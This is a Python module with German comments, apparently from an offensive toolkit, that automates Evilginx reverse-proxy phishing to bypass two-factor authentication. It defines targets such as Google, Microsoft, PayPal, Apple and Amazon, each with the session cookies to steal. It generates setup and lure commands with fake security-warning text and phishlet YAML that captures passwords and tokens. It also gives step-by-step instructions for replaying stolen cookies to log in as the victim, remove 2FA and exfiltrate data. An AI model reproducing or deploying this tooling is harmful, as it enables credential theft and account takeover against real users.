"""
Evilginx2/v3 Integration — 2FA-Bypass Phishing via Reverse Proxy.

Was Evilginx macht:
  Normales Phishing klaut nur Passwort — 2FA blockiert den Angreifer.
  Evilginx sitzt als MITM-Proxy zwischen Opfer und echter Website:
    Opfer → Evilginx (fängt Credentials + Session-Cookie ab) → echte Website
  Ergebnis: Session-Cookie = eingeloggt als Opfer, OHNE 2FA zu kennen!

Voraussetzungen:
  1. Domain (z.B. g00gle-login.com) — kostet ~10€/Jahr
  2. DNS A-Record: * → deine Server-IP
  3. Evilginx v3 installiert:
     go install github.com/kgretzky/evilginx/v3@latest
     oder: apt install evilginx2

Workflow:
  1. Phishlet wählen (Google, Microsoft, Instagram, GitHub, Office365...)
  2. Domain konfigurieren
  3. Lure-URL generieren (schicken an Opfer)
  4. Evilginx starten
  5. Sessions + Credentials in Echtzeit überwachen

Phishlets (fertig):
  google, microsoft, o365, instagram, linkedin, github, facebook, twitter, discord
"""

from __future__ import annotations
from typing import AsyncGenerator
from core.runner import CommandRunner
from core.output_dir import get as out_dir
import os


# ── Phishlet Definitionen ─────────────────────────────────────────────────────

PHISHLETS: dict[str, dict] = {
    "google": {
        "name": "Google",
        "subdomain": "accounts",
        "hostname": "google.com",
        "icon": "🔵",
        "desc": "Gmail, Google Drive, GCP — Session-Cookie umgeht 2FA/MFA",
        "lure_path": "/signin",
        "cookie_targets": ["SAPISID", "SSID", "HSID", "SID", "__Secure-1PSID"],
    },
    "microsoft": {
        "name": "Microsoft",
        "subdomain": "login",
        "hostname": "microsoftonline.com",
        "icon": "🟦",
        "desc": "Microsoft 365, Azure, Outlook — ESTSAUTH Cookie",
        "lure_path": "/",
        "cookie_targets": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"],
    },
    "o365": {
        "name": "Office 365",
        "subdomain": "office",
        "hostname": "microsoft.com",
        "icon": "🟧",
        "desc": "Office 365 Business — Redirect nach SharePoint/Teams",
        "lure_path": "/",
        "cookie_targets": ["ESTSAUTH", "ESTSAUTHPERSISTENT"],
    },
    "instagram": {
        "name": "Instagram",
        "subdomain": "www",
        "hostname": "instagram.com",
        "icon": "📸",
        "desc": "Instagram — sessionid Cookie für vollständigen Zugriff",
        "lure_path": "/",
        "cookie_targets": ["sessionid", "ds_user_id", "csrftoken"],
    },
    "facebook": {
        "name": "Facebook",
        "subdomain": "www",
        "hostname": "facebook.com",
        "icon": "📘",
        "desc": "Facebook/Meta — c_user + xs Cookies",
        "lure_path": "/",
        "cookie_targets": ["c_user", "xs", "fr"],
    },
    "linkedin": {
        "name": "LinkedIn",
        "subdomain": "www",
        "hostname": "linkedin.com",
        "icon": "💼",
        "desc": "LinkedIn — JSESSIONID + li_at Cookie",
        "lure_path": "/login",
        "cookie_targets": ["li_at", "JSESSIONID", "liap"],
    },
    "github": {
        "name": "GitHub",
        "subdomain": "github",
        "hostname": "github.com",
        "icon": "🐙",
        "desc": "GitHub — user_session Cookie → Repo-Zugriff ohne 2FA",
        "lure_path": "/login",
        "cookie_targets": ["user_session", "__Host-user_session_same_site"],
    },
    "discord": {
        "name": "Discord",
        "subdomain": "discord",
        "hostname": "discord.com",
        "icon": "💜",
        "desc": "Discord — dcfduid + sdcfduid + locale Cookies",
        "lure_path": "/login",
        "cookie_targets": ["dcfduid", "sdcfduid", "__dcfduid"],
    },
    "twitter": {
        "name": "Twitter/X",
        "subdomain": "twitter",
        "hostname": "x.com",
        "icon": "🐦",
        "desc": "Twitter/X — auth_token + ct0 Cookies → vollständiger Zugriff",
        "lure_path": "/i/flow/login",
        "cookie_targets": ["auth_token", "ct0", "twid"],
    },
    "apple": {
        "name": "Apple",
        "subdomain": "appleid",
        "hostname": "apple.com",
        "icon": "🍎",
        "desc": "Apple ID / iCloud — myacinfo Cookie → Find My, iCloud, App Store",
        "lure_path": "/sign-in",
        "cookie_targets": ["myacinfo", "dslang", "site", "acn01", "aasp"],
    },
    "paypal": {
        "name": "PayPal",
        "subdomain": "www",
        "hostname": "paypal.com",
        "icon": "💳",
        "desc": "PayPal — cookie_check + ts Session → vollständiger Kontenzugriff",
        "lure_path": "/signin",
        "cookie_targets": ["cookie_check", "ts", "ts_c", "enforce_policy"],
    },
    "amazon": {
        "name": "Amazon",
        "subdomain": "www",
        "hostname": "amazon.de",
        "icon": "📦",
        "desc": "Amazon — session-id + ubid Cookie → Bestellungen, Zahlungen",
        "lure_path": "/ap/signin",
        "cookie_targets": ["session-id", "session-id-time", "ubid-acbde", "at-acbde"],
    },
}


# ── Setup & Konfiguration ─────────────────────────────────────────────────────

def generate_setup_commands(
    domain: str,
    server_ip: str,
    redirect_url: str = "https://google.com",
) -> list[str]:
    """
    Evilginx v3 Ersteinrichtung nach der Installation.
    domain = deine Phishing-Domain (z.B. secure-accounts.net)
    server_ip = IP des Servers wo Evilginx läuft
    """
    return [
        "# ── Schritt 1: Evilginx starten ──────────────────────────",
        f"evilginx -p ~/.evilginx/phishlets/",
        "",
        "# ── In der Evilginx-Konsole (nach dem Starten): ──────────",
        f"config domain {domain}",
        f"config ipv4 {server_ip}",
        "",
        "# Phishlet aktivieren (z.B. Google):",
        f"phishlets hostname google {domain}",
        f"phishlets enable google",
        "",
        "# SSL-Zertifikat holen (Let's Encrypt):",
        f"# Evilginx macht das automatisch wenn DNS stimmt",
        "",
        "# Lure erstellen (Link den du verschickst):",
        f"lures create google",
        f"lures get-url 0",
        "",
        f"# Default Redirect (wenn kein Lure-Token):",
        f"config redirect_url {redirect_url}",
        "",
        "# ── Schritt 2: DNS-Setup (bei deinem Domain-Provider) ────",
        f"A    *          → {server_ip}",
        f"A    {domain}   → {server_ip}",
        "",
        "# ── Schritt 3: Firewall ──────────────────────────────────",
        "ufw allow 80/tcp",
        "ufw allow 443/tcp",
        "ufw allow 53/udp",
    ]


def generate_phishlet_yaml(phishlet_key: str, domain: str) -> str:
    """
    Generiert ein fertig konfiguriertes Phishlet YAML für Evilginx v3.
    Kann direkt in ~/.evilginx/phishlets/ gespeichert werden.
    """
    if phishlet_key not in PHISHLETS:
        return f"# Phishlet '{phishlet_key}' nicht bekannt"

    p = PHISHLETS[phishlet_key]
    cookies_yaml = "\n".join(
        f"      - name: '{c}'\n        domain: '.{p['hostname']}'\n        optional: true"
        for c in p["cookie_targets"]
    )

    # Für Standard-Phishlets die Community-Phishlets empfehlen
    return f"""# Phishlet: {p['name']}
# Quelle: https://github.com/An0nUD4Y/Evilginx2-Phishlets
# Datei: ~/.evilginx/phishlets/{phishlet_key}.yaml
#
# Diese Datei ist ein Starter-Template.
# Für produktive Nutzung Community-Phishlets verwenden:
#   git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets ~/.evilginx/phishlets

name: '{p['name']}'
author: 'PenKit'

proxy_hosts:
  - phish_sub: '{p['subdomain']}'
    orig_sub: '{p['subdomain']}'
    domain: '{p['hostname']}'
    session: true
    is_landing: true

sub_filters:
  - triggers_on: '{p['hostname']}'
    orig_sub: '{p['subdomain']}'
    domain: '{p['hostname']}'
    search: 'https://{{orig_sub}}.{{domain}}'
    replace: 'https://{{phish_sub}}.{{domain}}'
    mimes: ['text/html', 'application/json', 'application/javascript']

auth_tokens:
{cookies_yaml}

credentials:
  username:
    key: 'email|identifier|login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password|passwd|Passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: '{p['hostname']}'
  path: '{p["lure_path"]}'
"""


# ── Session-Monitoring ────────────────────────────────────────────────────────

async def monitor_sessions() -> AsyncGenerator[str, None]:
    """
    Zeigt aktive Evilginx-Sessions in Echtzeit.
    Muss in der Evilginx-Konsole oder via API abgefragt werden.
    """
    runner = CommandRunner()

    yield "\033[1;36m[*] Evilginx Session Monitor\033[0m"
    yield "\033[90m    Überwacht aktive Sessions und Credential-Captures\033[0m\n"

    # Prüfe ob evilginx läuft
    async for line in runner.run(["pgrep", "-la", "evilginx"]):
        if "evilginx" in line.lower():
            yield f"\033[32m[✓] Evilginx läuft: {line}\033[0m"
            break
    else:
        yield "\033[33m[!] Evilginx nicht aktiv. Starten: evilginx\033[0m"
        return

    yield ""
    yield "\033[33m[*] In der Evilginx-Konsole eingeben:\033[0m"
    yield "\033[36m  sessions          — alle aktiven Sessions anzeigen\033[0m"
    yield "\033[36m  sessions 0        — Session 0 im Detail\033[0m"
    yield "\033[36m  creds             — alle abgefangenen Credentials\033[0m"


async def extract_cookies_guide(session_id: int = 0) -> AsyncGenerator[str, None]:
    """Anleitung: abgefangene Cookies im Browser nutzen."""
    yield "\033[1;36m[*] Session-Cookie → Browser-Login (ohne 2FA)\033[0m\n"

    yield "\033[33m[Schritt 1] Cookie aus Evilginx holen:\033[0m"
    yield "\033[36m  In Evilginx-Konsole: sessions\033[0m"
    yield "\033[36m  Dann: sessions <ID>  →  Cookies anzeigen\033[0m"
    yield ""

    yield "\033[33m[Schritt 2] Cookie im Browser setzen:\033[0m"
    yield "\033[36m  Firefox/Chrome: F12 → Konsole → folgendes eingeben:\033[0m"
    yield ""
    yield "\033[36m  // Für Google:\033[0m"
    yield "\033[36m  document.cookie = 'SAPISID=<wert>; domain=.google.com; path=/'\033[0m"
    yield ""
    yield "\033[36m  // Einfacher via Cookie-Editor Extension:\033[0m"
    yield "\033[36m  1. 'Cookie Editor' Extension installieren\033[0m"
    yield "\033[36m  2. Zur Ziel-Domain navigieren\033[0m"
    yield "\033[36m  3. Cookie Editor öffnen → Import → JSON einfügen\033[0m"
    yield ""

    yield "\033[33m[Schritt 3] Session nutzen:\033[0m"
    yield "\033[36m  Seite neu laden → eingeloggt als Opfer\033[0m"
    yield "\033[36m  → Passwort ändern, 2FA entfernen, Daten exfiltrieren\033[0m"
    yield ""

    yield "\033[33m[Cookie Format für Import]:\033[0m"
    yield '\033[36m  [{"name":"SAPISID","value":"HIER_COOKIE_WERT","domain":".google.com"}]\033[0m'


# ── Lure URL Generator ────────────────────────────────────────────────────────

def generate_lure_commands(
    phishlet: str,
    redirect_url: str = "",
    custom_path: str = "",
) -> list[str]:
    """Evilginx-Befehle um Lure-URLs zu erstellen + zu konfigurieren."""
    cmds = [
        f"# Neue Lure für {phishlet} erstellen:",
        f"lures create {phishlet}",
        "",
        "# URL anzeigen (0 = erste Lure):",
        "lures get-url 0",
        "",
        "# Lure konfigurieren:",
    ]

    if redirect_url:
        cmds.append(f"lures edit 0 redirect_url {redirect_url}")

    if custom_path:
        cmds.append(f"lures edit 0 path {custom_path}")

    cmds += [
        "lures edit 0 og_title 'Sicherheitswarnung — Bitte anmelden'",
        "lures edit 0 og_desc 'Ungewöhnliche Aktivität erkannt. Identität bestätigen.'",
        "",
        "# Alle Lures anzeigen:",
        "lures",
        "",
        "# Lure-Statistiken (wer hat geklickt):",
        "lures 0",
    ]

    return cmds


# ── Vollständiger Start-Wizard ────────────────────────────────────────────────

async def evilginx_wizard(
    phishlet_key: str,
    domain: str,
    server_ip: str,
    lure_redirect: str = "https://google.com",
) -> AsyncGenerator[str, None]:
    """
    Vollständiger Evilginx-Setup von Anfang bis fertige Lure-URL.
    """
    if phishlet_key not in PHISHLETS:
        yield f"\033[33m[!] Unbekanntes Phishlet: {phishlet_key}\033[0m"
        return

    p = PHISHLETS[phishlet_key]
    phishlets_dir = os.path.expanduser("~/.evilginx/phishlets")

    yield f"\033[1;36m[*] Evilginx Wizard — {p['icon']} {p['name']}\033[0m"
    yield f"\033[90m    Domain: {domain} | Server: {server_ip}\033[0m\n"

    # Prüfe Installation
    runner = CommandRunner()
    has_evilginx = False
    async for line in runner.run(["which", "evilginx"]):
        if line.strip():
            has_evilginx = True

    if not has_evilginx:
        yield "\033[33m[!] Evilginx nicht installiert.\033[0m"
        yield "\033[36m    Installieren:\033[0m"
        yield "\033[36m    go install github.com/kgretzky/evilginx/v3@latest\033[0m"
        yield "\033[36m    # oder: apt install evilginx2\033[0m"
        yield ""

    # Phishlet YAML generieren
    yield "\033[33m[1] Community-Phishlets herunterladen:\033[0m"
    yield f"\033[36m    git clone https://github.com/An0nUD4Y/Evilginx2-Phishlets {phishlets_dir}\033[0m"
    yield ""

    # Setup Commands
    yield "\033[33m[2] Evilginx einrichten:\033[0m"
    for cmd in generate_setup_commands(domain, server_ip, lure_redirect):
        if cmd.startswith("#"):
            yield f"\033[90m    {cmd}\033[0m"
        elif cmd:
            yield f"\033[36m    {cmd}\033[0m"
        else:
            yield ""

    # Lure Commands
    yield "\033[33m[3] Lure-URL generieren:\033[0m"
    for cmd in generate_lure_commands(phishlet_key, lure_redirect):
        if cmd.startswith("#"):
            yield f"\033[90m    {cmd}\033[0m"
        elif cmd:
            yield f"\033[36m    {cmd}\033[0m"
        else:
            yield ""

    # DNS Check
    yield "\033[33m[4] DNS prüfen:\033[0m"
    yield f"\033[36m    dig {domain} @8.8.8.8 +short  # sollte {server_ip} zeigen\033[0m"
    yield f"\033[36m    dig accounts.{domain} @8.8.8.8 +short  # wildcard\033[0m"
    yield ""

    yield "\033[32m[✓] Setup komplett. Lure-URL verschicken → Cookies abfangen → Browser-Login\033[0m"
    yield f"\033[90m    Ziel-Cookies: {', '.join(p['cookie_targets'][:3])}...\033[0m"
